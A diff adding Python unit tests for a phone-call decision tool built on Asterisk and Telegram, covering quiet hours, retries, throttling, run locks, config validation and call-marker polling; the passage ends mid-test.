+        import re as _re
+        for name, text in texts.items():
+            flat = _re.sub(r"\s+", " ", text)
+            with self.subTest(doc=name):
+                phrase = "fatal flaw from the contrarian went unanswered" if name == "command" else "unanswered fatal flaw"
+                self.assertIn(phrase, flat)
+                self.assertNotIn("unanswered security or data-loss flaw: the two cases", flat)
+
+    def test_the_skill_defines_what_set_up_means(self):
+        skill = (SCRIPT.parents[1] / "SKILL.md").read_text()
+        self.assertIn("## Is it set up?", skill)
+        for doc in (SCRIPT.parents[2] / "council-policy" / "SKILL.md", SCRIPT.parents[2] / ".." / "commands" / "council.md"):
+            self.assertIn("Is it set up?", doc.read_text(), str(doc))
+
+    def test_a_hangup_with_the_end_marker_already_there_does_not_wait_for_a_grace_period(self):
+        result, asterisk, _ = run_ask([{1: {"answered": "1", "done": "1"}}], config={"attempts": 1})
+        self.assertEqual(result["status"], "hangup")
+        self.assertLess(run_ask.clock.now, 5)  # no extra polling after the dialplan said it was over
+
+    def test_turning_the_throttle_off_does_not_turn_the_run_lock_off(self):
+        lock = Path(tempfile.mkdtemp()) / "run.lock"
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=None, lock_file=str(lock))
+        first = ceo.acquire_run_lock(cfg)
+        try:
+            with self.assertRaises(ceo.CallError) as caught:
+                ceo.acquire_run_lock(cfg)
+            self.assertIn("still running", str(caught.exception))
+        finally:
+            first.close()
+
+    def test_a_retry_pushed_into_quiet_hours_after_a_ring_says_so(self):
+        text = ceo.notification_text("q", ["a", "b"], "deferred_retry")
+        self.assertNotIn("no llamé", text)
+        self.assertIn("volví", text)
+        times = iter([(21, 55), (21, 55), (21, 55), (22, 5), (22, 5)])
+        sent = []
+        asterisk = FakeAsterisk(["unanswered"])
+        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, attempts=2, quiet_start="22:00", quiet_end="08:00")
+        clock = FakeClock()
+        ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}, asterisk,
+                synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, *next(times, (22, 5))))
+        self.assertIn("volví", sent[0])
+
+    def test_a_request_file_over_the_byte_limit_is_refused_not_truncated(self):
+        path = Path(tempfile.mkdtemp()) / "request.json"
+        self.addCleanup(lambda: path.exists() and path.unlink())
+        # Valid JSON for the first 64 KiB + 1 bytes would otherwise pass a character count after decoding.
+        path.write_bytes(b'["' + "é".encode() * (ceo.MAX_REQUEST_BYTES // 2) + b'"]')
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.read_request(str(path))
+        self.assertIn("longer than", str(caught.exception))
+
+    def test_non_utf8_stdin_is_reported_as_such(self):
+        import unittest.mock as mock
+
+        class BadStdin:
+            buffer = io.BytesIO(b"\xff\xfe{")
+
+        with mock.patch.object(ceo.sys, "stdin", BadStdin()):
+            with self.assertRaises(ceo.CallError) as caught:
+                ceo.read_request("-")
+        self.assertIn("UTF-8", str(caught.exception))
+
+    def test_lock_file_null_turns_the_run_lock_off_even_when_a_state_file_is_set(self):
+        state = self.throttle_state()
+        cfg = dict(ceo.DEFAULT_CONFIG, state_file=str(state), lock_file=None)
+        first = ceo.acquire_run_lock(cfg)
+        second = ceo.acquire_run_lock(cfg)  # no lock: a second one is not refused
+        first.close()
+        second.close()
+
+    def test_the_last_prompt_cannot_push_the_request_over_the_speech_budget(self):
+        clock = FakeClock()
+
+        def slow_synth(host, port, text):
+            clock.sleep(70)  # two options: five prompts, the last one ends at 350 s
+            return fake_synth(host, port, text)
+
+        asterisk = FakeAsterisk(["1"])
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk,
+                    synth=slow_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertIn("speech took too long", str(caught.exception))
+        self.assertEqual(asterisk.originated, 0)
+
+    def test_a_call_that_finishes_between_the_last_reads_keeps_its_confirmation(self):
+        clock = FakeClock()
+        call_id = "ab" * 8
+        base = "%s/ceo/%s" % (ceo.SPOOL, call_id)
+
+        class Racy(FakeAsterisk):
+            """The call ends (result, then done) right after the last result read at the deadline."""
+            finished = False
+
+            def originate(self, name, call_file, before_commit=None):
+                self.files[base + "/answered"] = "1"
+
+            def read_file(self, path):
+                if path.endswith("/result") and clock.now >= 330 and not self.finished:
+                    self.finished = True
+                    self.files[base + "/result"] = "2"
+                    self.files[base + "/done"] = "1"
+                    return None
+                return self.files.get(path)
+
+        cfg = dict(ceo.DEFAULT_CONFIG, poll_interval_s=2, ring_timeout_s=30, call_timeout_s=300)
+        outcome = ceo.run_attempt(Racy([]), cfg, call_id, 3, sleep=clock.sleep, clock=clock)
+        self.assertEqual(outcome, {"status": "decided", "choice": 2, "call_open": False})
+
+    def test_quiet_hours_are_checked_again_after_the_call_file_is_staged(self):
+        clock = FakeClock()
+        hour = [12]
+
+        class SlowDocker(FakeAsterisk):
+            def originate(self, name, call_file, before_commit=None):
+                hour[0] = 23  # the quiet window opens while the call file is being staged
+                super().originate(name, call_file, before_commit)
+
+        asterisk = SlowDocker(["1"])
+        result = ceo.ask({"question": "q", "options": ["a", "b"]},
+                         dict(ceo.DEFAULT_CONFIG, quiet_start="22:00", quiet_end="07:00"), {}, asterisk,
+                         synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, hour[0], 30))
+        self.assertEqual(result["status"], "deferred")
+        self.assertEqual(asterisk.originated, 0)
+
+    def test_a_late_confirmation_still_gets_the_thank_you_wait(self):
+        clock = FakeClock()
+        call_id = "ab" * 8
+        base = "%s/ceo/%s" % (ceo.SPOOL, call_id)
+
+        class Late(FakeAsterisk):
+            def originate(self, name, call_file, before_commit=None):
+                self.files[base + "/answered"] = "1"
+
+            def read_file(self, path):
+                if path.endswith("/result") and clock.now >= 334:
+                    return "2"  # found by the final reads or the grace loop, not by the main loop
+                if path.endswith("/done") and clock.now >= 344:
+                    return "1"
+                return self.files.get(path)
+
+        cfg = dict(ceo.DEFAULT_CONFIG, poll_interval_s=2, ring_timeout_s=30, call_timeout_s=300)
+        outcome = ceo.run_attempt(Late([]), cfg, call_id, 3, sleep=clock.sleep, clock=clock)
+        self.assertEqual(outcome, {"status": "decided", "choice": 2, "call_open": False})
+        self.assertGreaterEqual(clock.now, 344)  # waited for the dialplan to finish before the folder can go
+
+    def test_a_stop_request_during_the_final_cleanup_keeps_a_confirmed_decision(self):
+        class StopsOnFolderRemoval(FakeAsterisk):
+            def remove(self, *paths, strict=False):
+                if len(paths) == 1 and not strict:
+                    raise ceo.Interrupted("stopped")
+                super().remove(*paths, strict=strict)
+
+        asterisk = StopsOnFolderRemoval(["2"])
+        clock = FakeClock()
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk,
+                         synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+        ceo.acquire_run_lock(dict(ceo.DEFAULT_CONFIG)).close()  # the run lock was released too
+
+    def test_a_decision_without_an_end_marker_keeps_the_folder_but_is_still_returned(self):
+        clock = FakeClock()
+        asterisk = FakeAsterisk([{1: {"answered": "1", "result": "2"}}])  # `done` never appears
+        result = ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk,
+                         synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+        self.assertNotIn("call_open", result)
+        self.assertTrue(asterisk.dirs)  # the call may still need its prompts; the daily sweep removes the folder
+
+    def test_a_heads_up_sent_after_the_quiet_window_opened_is_silent(self):
+        clock = FakeClock()
+        hour = [12]
+        sent = []
+
+        class Asleep(FakeAsterisk):
+            asked = 0
+
+            def endpoint_available(self, endpoint):
+                self.asked += 1
+                hour[0] = 23  # the contact query crosses into the quiet window
+                return self.asked > 1
+
+        result = ceo.ask({"question": "q", "options": ["a", "b"]},
+                         dict(ceo.DEFAULT_CONFIG, quiet_start="22:00", quiet_end="07:00", heads_up_s=10),
+                         {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}, Asleep(["1"]),
+                         synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append((text, silent)) or True,
+                         sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, hour[0], 30))
+        self.assertEqual(result["status"], "deferred")
+        self.assertTrue(all(silent for _, silent in sent) and sent)
+
+    def test_a_phone_that_is_already_in_a_call_is_not_dialled(self):
+        asterisk = FakeAsterisk(["1"])
+        asterisk.in_call = True
+        clock = FakeClock()
+        sent = []
+        with self.assertRaises(ceo.CallError) as caught:
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"},
+                    asterisk, synth=fake_synth, notifier=lambda t, c, text, silent=False: sent.append(text) or True,
+                    sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertIn("already in a call", str(caught.exception))
+        self.assertEqual(asterisk.originated, 0)
+        self.assertEqual(len(sent), 1)  # the owner is told the decision is pending
+        self.assertEqual(asterisk.dirs, set())
+
+    def test_a_call_file_that_definitely_never_got_in_gives_the_slot_back(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+
+        class OriginateFails(FakeAsterisk):
+            def originate(self, name, call_file, before_commit=None):
+                raise ceo.DockerError("a command inside the Asterisk container failed")
+
+        asterisk = OriginateFails([])
+        clock = FakeClock()
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120), {}, asterisk,
+                    synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertEqual(state.read_text().strip(), "")  # no call exists and nothing reached the owner
+
+    def test_a_call_file_move_that_timed_out_may_have_rung_so_it_keeps_the_slot(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+
+        class OriginateTimesOut(FakeAsterisk):
+            def originate(self, name, call_file, before_commit=None):
+                raise ceo.DockerTimeout("cannot run docker (timed out)")
+
+        asterisk = OriginateTimesOut([])
+        clock = FakeClock()
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG, state_file=str(state), min_gap_s=120), {}, asterisk,
+                    synth=fake_synth, sleep=clock.sleep, clock=clock, now=lambda: datetime(2026, 1, 1, 12, 0))
+        self.assertNotEqual(state.read_text().strip(), "")
+
+    def test_a_second_ask_too_soon_is_refused_before_any_call(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        cfg = {"state_file": str(state), "min_gap_s": 120}
+        result, asterisk, _ = run_ask(["1"], config=cfg)
+        self.assertEqual(result["status"], "decided")
+        self.assertTrue(state.exists())
+        with self.assertRaises(ceo.CallError) as caught:
+            run_ask(["1"], config=cfg)
+        self.assertIn("too soon", str(caught.exception))
+
+    def test_an_ask_after_the_gap_is_allowed_and_the_throttle_can_be_off(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        state.write_text(str(__import__("time").time() - 500))
+        self.addCleanup(lambda: state.exists() and state.unlink())
+        result, _, _ = run_ask(["1"], config={"state_file": str(state), "min_gap_s": 120})
+        self.assertEqual(result["status"], "decided")
+        result, _, _ = run_ask(["1"], config={"state_file": str(state), "min_gap_s": 0})
+        self.assertEqual(result["status"], "decided")
+
+    def test_a_deferred_request_does_not_start_the_throttle(self):
+        state = Path(tempfile.mkdtemp()) / "last_ask"
+        run_ask([], config={"state_file": str(state), "min_gap_s": 120, "quiet_start": "23:00", "quiet_end": "08:00"}, clock_time=(3, 0))
+        self.assertEqual(state.read_text().strip() if state.exists() else "", "")  # nothing reached the owner: no slot used
+
+    def test_no_answer_retries_then_notifies_once(self):
+        result, asterisk, sent = run_ask(["unanswered"] * 3, env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
+        self.assertEqual(result["status"], "unanswered")
+        self.assertEqual(asterisk.originated, 3)
+        self.assertTrue(result["notified"])
+        self.assertEqual(len(sent), 1)
+        self.assertIn("Ship it?", sent[0][2])
+        self.assertIn("1. Yes", sent[0][2])
+        self.assertFalse(sent[0][3])
+
+    def test_answer_on_a_later_attempt_is_accepted_without_notifying(self):
+        result, asterisk, sent = run_ask(["unanswered", "unanswered", "3"], env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
+        self.assertEqual((result["status"], result["choice"], result["attempt"]), ("decided", 3, 3))
+        self.assertEqual(asterisk.originated, 3)
+        self.assertEqual(sent, [])
+
+    def test_hanging_up_before_confirming_is_not_a_decision(self):
+        result, asterisk, sent = run_ask(["hangup"] * 3, env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
+        self.assertEqual(result["status"], "hangup")
+        self.assertEqual(asterisk.originated, 1)  # the owner picked up and chose to hang up: no re-ring
+        self.assertEqual(len(sent), 1)
+
+    def test_undecided_is_final_and_notifies(self):
+        result, asterisk, sent = run_ask(["undecided"], env={"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"})
+        self.assertEqual(result["status"], "undecided")
+        self.assertEqual(asterisk.originated, 1)
+        self.assertEqual(len(sent), 1)
+
+    def test_a_result_outside_the_option_range_is_never_accepted(self):
+        for bad in ["4", "0", "9", "x", "12", "1 2", "-1"]:
+            with self.subTest(result=bad):
+                with self.assertRaises(ceo.CallError):
+                    run_ask([bad])
+
+    def test_files_are_removed_even_when_the_call_errors(self):
+        asterisk = FakeAsterisk(["7"])
+        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0)
+        clock = FakeClock()
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "q", "options": ["a", "b"]}, cfg, {}, asterisk, synth=fake_synth,
+                    sleep=clock.sleep, clock=clock)
+        self.assertEqual(asterisk.files, {})
+        self.assertEqual(asterisk.dirs, set())
+
+    def test_a_call_nobody_picks_up_gives_up_after_the_ring_window(self):
+        run_ask(["unanswered"], config={"attempts": 1})
+        self.assertGreaterEqual(run_ask.clock.now, 45)   # ring_timeout_s + 15
+        self.assertLess(run_ask.clock.now, 50)
+
+    def test_the_owner_takes_a_while_to_answer_and_to_choose(self):
+        late = {3: {"answered": "1"}, 40: {"result": "2"}, 44: {"done": "1"}}
+        result, asterisk, _ = run_ask([late])
+        self.assertEqual((result["status"], result["choice"]), ("decided", 2))
+        self.assertEqual(asterisk.originated, 1)
+        self.assertEqual(asterisk.files, {})
+
+    def test_the_result_waits_for_the_thank_you_message_to_finish(self):
+        late = {2: {"answered": "1", "result": "1"}, 6: {"done": "1"}}
+        result, asterisk, _ = run_ask([late])
+        self.assertEqual(result["status"], "decided")
+        self.assertGreaterEqual(asterisk.reads, 6)
+
+    def test_answering_then_never_finishing_ends_at_the_call_deadline_as_a_timeout(self):
+        stuck = {2: {"answered": "1"}}
+        result, _, _ = run_ask([stuck], config={"attempts": 1})
+        self.assertEqual(result["status"], "timeout")
+        self.assertGreaterEqual(run_ask.clock.now, 330)  # ring_timeout_s + call_timeout_s
+        self.assertLess(run_ask.clock.now, 330 + 2 * ceo.GRACE_POLLS + 5)  # plus the short grace for a live call
+
+    def test_an_answered_call_is_not_reported_as_unanswered_when_the_marker_is_seen_late(self):
+        result, _, _ = run_ask([{40: {"answered": "1", "done": "1"}}], config={"attempts": 1})
+        self.assertEqual(result["status"], "hangup")
+
+    def test_without_chat_settings_nothing_is_sent_and_it_says_so(self):
+        result, _, sent = run_ask(["unanswered"] * 3)
+        self.assertFalse(result["notified"])
+        self.assertEqual(sent, [])
+
+    def test_invalid_request_places_no_call(self):
+        asterisk = FakeAsterisk([])
+        with self.assertRaises(ceo.CallError):
+            ceo.ask({"question": "", "options": ["a", "b"]}, dict(ceo.DEFAULT_CONFIG), {}, asterisk, synth=fake_synth)
+        self.assertEqual(asterisk.originated, 0)
+
+
+class QuietHoursTests(unittest.TestCase):
+    ENV = {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}
+
+    def test_window_wrapping_midnight(self):
+        quiet = lambda hm: ceo.in_quiet_hours(hm, "23:00", "08:00")
+        self.assertTrue(quiet("23:00") and quiet("03:30") and quiet("07:59"))
+        self.assertFalse(quiet("08:00") or quiet("12:00") or quiet("22:59"))
+
+    def test_window_within_one_day_and_unset_windows(self):
+        self.assertTrue(ceo.in_quiet_hours("13:00", "12:00", "14:00"))
+        self.assertFalse(ceo.in_quiet_hours("14:00", "12:00", "14:00"))
+        self.assertFalse(ceo.in_quiet_hours("03:00", None, None))
+        self.assertFalse(ceo.in_quiet_hours("03:00", "08:00", "08:00"))
+
+    def test_during_quiet_hours_no_call_is_placed_and_the_message_is_silent(self):
+        result, asterisk, sent = run_ask([], env=self.ENV, config={"quiet_start": "23:00", "quiet_end": "08:00"}, clock_time=(3, 0))
+        self.assertEqual(result["status"], "deferred")
+        self.assertEqual(asterisk.originated, 0)
+        self.assertEqual(result["attempt"], 0)  # every outcome carries the same keys
+        self.assertEqual(len(sent), 1)
+        self.assertTrue(sent[0][3])
+
+    def test_quiet_hours_are_checked_again_before_every_retry(self):
+        times = iter([(21, 55), (21, 55), (21, 55), (22, 5), (22, 10), (22, 10)])
+        original = ceo.ask
+
+        def clocked(*args, **kwargs):
+            kwargs["now"] = lambda: datetime(2026, 1, 1, *next(times))
+            return original(*args, **kwargs)
+
+        cfg = dict(ceo.DEFAULT_CONFIG, retry_delay_s=0, poll_interval_s=2, ring_timeout_s=30,
+                   call_timeout_s=300, attempts=3, quiet_start="22:00", quiet_end="08:00")
+        asterisk = FakeAsterisk(["unanswered", "unanswered", "unanswered"])
+        sent = []
+        clock = FakeClock()
+        result = clocked({"question": "q", "options": ["a", "b"]}, cfg, self.ENV, asterisk, synth=fake_synth,
+                         notifier=lambda t, c, text, silent=False: sent.append(silent) or True,
+                         sleep=clock.sleep, clock=clock)
+        self.assertEqual(asterisk.originated, 1)
+        self.assertEqual(result["status"], "deferred")
+        self.assertEqual(sent, [True])  # silent message, no night call
+
+    def test_outside_quiet_hours_the_call_is_placed(self):
+        result, asterisk, sent = run_ask(["1"], env=self.ENV, config={"quiet_start": "23:00", "quiet_end": "08:00"}, clock_time=(12, 0))
+        self.assertEqual(result["status"], "decided")
+
+    def test_timezone_must_be_a_known_zone(self):
+        for bad in ('{"timezone": "Mars/Base"}', '{"timezone": 3}'):
+            with self.subTest(bad=bad):
+                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+                handle.write(bad)
+                handle.close()
+                self.addCleanup(os.unlink, handle.name)
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(handle.name)
+
+    def test_the_poll_interval_is_bounded_so_a_run_stays_below_the_sweep_age(self):
+        for bad in ('{"poll_interval_s": 1000}', '{"poll_interval_s": 61}',
+                    '{"attempts": 10, "poll_interval_s": 60, "call_timeout_s": 3600, "retry_delay_s": 3600}'):
+            with self.subTest(bad=bad):
+                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+                handle.write(bad)
+                handle.close()
+                self.addCleanup(os.unlink, handle.name)
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(handle.name)
+
+    def test_heads_up_and_delays_are_validated(self):
+        for bad in ('{"heads_up_s": "90"}', '{"heads_up_s": -1}', '{"heads_up_s": true}', '{"retry_delay_s": 100000}',
+                    '{"attempts": 10, "retry_delay_s": 3600, "heads_up_s": 3600, "call_timeout_s": 3600}'):
+            with self.subTest(bad=bad):
+                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+                handle.write(bad)
+                handle.close()
+                self.addCleanup(os.unlink, handle.name)
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(handle.name)
+
+    def test_the_port_must_be_a_real_tcp_port(self):
+        for bad in ('{"piper_port": 70000}', '{"piper_port": 0}'):
+            with self.subTest(bad=bad):
+                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+                handle.write(bad)
+                handle.close()
+                self.addCleanup(os.unlink, handle.name)
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(handle.name)
+
+    def test_an_out_of_range_port_in_synthesize_is_a_clean_error(self):
+        with self.assertRaises(ceo.CallError):
+            ceo.synthesize("127.0.0.1", 70000, "hola", timeout=1)
+
+    def test_container_and_hosts_must_be_strings(self):
+        for bad in ('{"container": 5}', '{"container": null}', '{"endpoint": 5}', '{"piper_host": 5}'):
+            with self.subTest(bad=bad):
+                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+                handle.write(bad)
+                handle.close()
+                self.addCleanup(os.unlink, handle.name)
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(handle.name)
+
+    def test_an_empty_state_file_path_is_refused_not_a_silent_off_switch(self):
+        handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+        handle.write('{"state_file": ""}')
+        handle.close()
+        self.addCleanup(os.unlink, handle.name)
+        with self.assertRaises(ceo.CallError):
+            ceo.load_config(handle.name)
+
+    def test_deeply_nested_config_json_is_a_clean_error(self):
+        handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+        handle.write("[" * 5000)
+        handle.close()
+        self.addCleanup(os.unlink, handle.name)
+        with self.assertRaises(ceo.CallError):
+            ceo.load_config(handle.name)
+
+    def test_a_zero_poll_interval_is_refused(self):
+        handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+        handle.write('{"poll_interval_s": 0}')
+        handle.close()
+        self.addCleanup(os.unlink, handle.name)
+        with self.assertRaises(ceo.CallError):
+            ceo.load_config(handle.name)
+
+    def test_quiet_hours_use_the_configured_timezone(self):
+        import unittest.mock as mock
+
+        class FakeDatetime:
+            seen = []
+
+            @staticmethod
+            def now(zone=None):
+                FakeDatetime.seen.append(zone)
+                return datetime(2026, 1, 1, 23, 30)
+
+        asterisk = FakeAsterisk([])
+        config = dict(ceo.DEFAULT_CONFIG, quiet_start="22:00", quiet_end="07:00", timezone="Europe/Madrid")
+        with mock.patch.object(ceo, "datetime", FakeDatetime):
+            result = ceo.ask({"question": "q", "options": ["a", "b"]}, config, {}, asterisk, synth=fake_synth)
+        self.assertEqual(result["status"], "deferred")
+        self.assertEqual(str(FakeDatetime.seen[0]), "Europe/Madrid")
+
+    def test_config_requires_both_ends(self):
+        for cfg in ('{"quiet_start": "23:00"}', '{"quiet_start": "25:00", "quiet_end": "08:00"}', '{"quiet_start": "23:00", "quiet_end": 8}'):
+            with self.subTest(cfg=cfg):
+                handle = tempfile.NamedTemporaryFile("w", suffix=".json", delete=False)
+                handle.write(cfg)
+                handle.close()
+                self.addCleanup(os.unlink, handle.name)
+                with self.assertRaises(ceo.CallError):
+                    ceo.load_config(handle.name)
+
+
+class HeadsUpTests(unittest.TestCase):
+    ENV = {"CEO_TELEGRAM_TOKEN": "t", "CEO_TELEGRAM_CHAT_ID": "9"}
+
+    def setup(self, registered, env=None, heads_up_s=90):
+        asterisk = FakeAsterisk([])
+        asterisk.registered = registered
+        clock = FakeClock()
+        sent = []
+        config = dict(ceo.DEFAULT_CONFIG, heads_up_s=heads_up_s, poll_interval_s=2)
+        result = ceo.wait_for_phone(asterisk, config, self.ENV if env is None else env,
+                                    lambda token, chat, text, silent=False: sent.append(text), clock.sleep, clock)
+        return result, sent, clock
+
+    def test_a_registered_phone_gets_no_message_and_no_wait(self):
+        result, sent, clock = self.setup(True)
+        self.assertEqual((result, sent, clock.now), (True, [], 0))
+
+    def test_an_unregistered_phone_is_messaged_once_and_waited_for(self):
+        reads = iter([False, False, False, True])
+        result, sent, clock = self.setup(lambda: next(reads))
+        self.assertTrue(result)
+        self.assertEqual(sent, [ceo.HEADS_UP])
+        self.assertGreater(clock.now, 0)
+
+    def test_giving_up_after_the_window(self):
+        result, sent, clock = self.setup(False)
+        self.assertFalse(result)
+        self.assertEqual(len(sent), 1)
+        self.assertGreaterEqual(clock.now, 90)
+        self.assertLess(clock.now, 95)
+
+    def test_without_chat_settings_or_with_the_window_off_nothing_is_sent_or_waited(self):
+        for env, heads_up in (({}, 90), (None, 0)):
+            with self.subTest(env=env, heads_up=heads_up):
+                result, sent, clock = self.setup(False, env=env, heads_up_s=heads_up)
+                self.assertEqual((result, sent, clock.now), (False, [], 0))
+
+    def test_the_message_goes_out_before_the_call_and_only_when_the_phone_is_missing(self):
+        events = []
+
+        def notifier(token, chat, text, silent=False):
+            events.append("message: " + text)
+            return True
+
+        original_originate, original_init = FakeAsterisk.originate, FakeAsterisk.__init__
+
+        def originate(self_, name, call_file, before_commit=None):
+            events.append("call")
+            original_originate(self_, name, call_file, before_commit)
+
+        def init(self_, script):
+            original_init(self_, script)
+            reads = iter([False, True, True, True])
+            self_.registered = lambda: next(reads)
+
+        FakeAsterisk.originate, FakeAsterisk.__init__ = originate, init
+        try:
+            result, _, _ = run_ask(["1"], env=self.ENV, notifier=notifier)
+        finally:
+            FakeAsterisk.originate, FakeAsterisk.__init__ = original_originate, original_init
+        self.assertEqual(result["status"], "decided")
+        self.assertEqual(events, ["message: " + ceo.HEADS_UP, "call"])
+
+    def test_a_phone_that_never_registers_is_not_dialled_and_the_owner_is_told(self):
+        original_init = FakeAsterisk.__init__
+
+        def init(self_, script):
+            original_init(self_, script)
+            self_.registered = False
+
+        FakeAsterisk.__init__ = init
+        try:
+            result, asterisk, sent = run_ask([], env=self.ENV, config={"heads_up_s": 10})
+        finally:
+            FakeAsterisk.__init__ = original_init
+        self.assertEqual(asterisk.originated, 0)
+        self.assertEqual((result["status"], result["reason"], result["attempt"]), ("unanswered", "phone_not_registered", 1))
+        self.assertTrue(result["notified"])
+        self.assertEqual(len(sent), 2)  # one heads-up, one final notification
+        self.assertEqual(asterisk.files, {})
+
+
+    def test_the_heads_up_is_sent_once_per_run_even_if_the_phone_drops_again(self):
+        asterisk = FakeAsterisk([])
+        clock = FakeClock()
+        sent = []
+        config = dict(ceo.DEFAULT_CONFIG, heads_up_s=4, poll_interval_s=2)
+        state = {}
+        for _ in range(3):
+            asterisk.registered = False
+            ceo.wait_for_phone(asterisk, config, self.ENV, lambda token, chat, text, silent=False: sent.append(text) or True, clock.sleep, clock, state)
+        self.assertEqual(sent, [ceo.HEADS_UP])
+
+
+        result, _, sent = run_ask(["1"], env=self.ENV)
+        self.assertEqual((result["status"], sent), ("decided", []))
+
+
+class DockerStateTests(unittest.TestCase):
+    def asterisk(self, returncode, stdout=b"", stderr=b""):
+        class Result:
+            pass
+
+        result = Result()
+        result.returncode, result.stdout, result.stderr = returncode, stdout, stderr
+        return ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: result)
+
+    def test_a_channel_of_the_endpoint_means_the_phone_is_in_a_call(self):
+        busy = b"PJSIP/phone-0000001a!ceo-ask!s!1!Up!Read!!!!3!00:00:12!\nPJSIP/other-0000001b!x!s!1!Up!\n"
+        idle = b"PJSIP/phone2-0000001c!x!s!1!Up!\n0 active channels\n"
+        self.assertTrue(self.asterisk(0, stdout=busy).endpoint_in_call("PJSIP/phone"))
+        self.assertFalse(self.asterisk(0, stdout=idle).endpoint_in_call("PJSIP/phone"))  # another endpoint, not a prefix match
+        self.assertFalse(self.asterisk(0, stdout=b"").endpoint_in_call("PJSIP/phone"))
+        with self.assertRaises(ceo.CallError):
+            self.asterisk(1, stderr=b"no asterisk").endpoint_in_call("PJSIP/phone")  # a failure is not "idle"
+
+    def test_a_missing_file_means_no_marker_yet(self):
+        # Detected by exit code, so a translated "No such file" message (non-C locale) still works.
+        self.assertIsNone(self.asterisk(3, stderr=b"cat: /x: No existe el fichero o el directorio").read_file("/x"))
+
+    def test_the_read_command_uses_a_file_test_not_error_text(self):
+        seen = []
+
+        class Result:
+            returncode, stdout, stderr = 0, b"1", b""
+
+        ceo.DockerAsterisk("asterisk", run=lambda command, **kwargs: seen.append(command) or Result()).read_file("/x")
+        self.assertIn("-e", " ".join(seen[0]))
+
+    def test_a_docker_failure_is_an_error_not_a_missing_marker(self):
+        for stderr in (b"Error response from daemon: container is not running", b"", b"Cannot connect to the Docker daemon", b"cat: /x: No such file or directory"):
+            with self.subTest(stderr=stderr):
+                with self.assertRaises(ceo.CallError):
+                    self.asterisk(1, stderr=stderr).read_file("/x")
+
+    def test_endpoint_match_is_exact(self):
+        contacts = (b" Contact:  phone2/sip:u@192.0.2.1:5060;ob   abc Avail  1.0\n"
+                    b" Contact:  phone-old/sip:u@192.0.2.1:5061   abc Avail  1.0\n")
+        self.assertFalse(self.asterisk(0, contacts).endpoint_available("PJSIP/phone"))
+        self.assertTrue(self.asterisk(0, contacts + b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc Avail  1.0\n").endpoint_available("PJSIP/phone"))
+        self.assertFalse(self.asterisk(0, b" Contact:  phone/sip:u@192.0.2.2:5060;ob   abc Unavail  nan\n").endpoint_available("PJSIP/phone"))
+
+    def test_a_failed_asterisk_command_is_an_error_not_an_empty_contact_list(self):
+        with self.assertRaises(ceo.CallError):
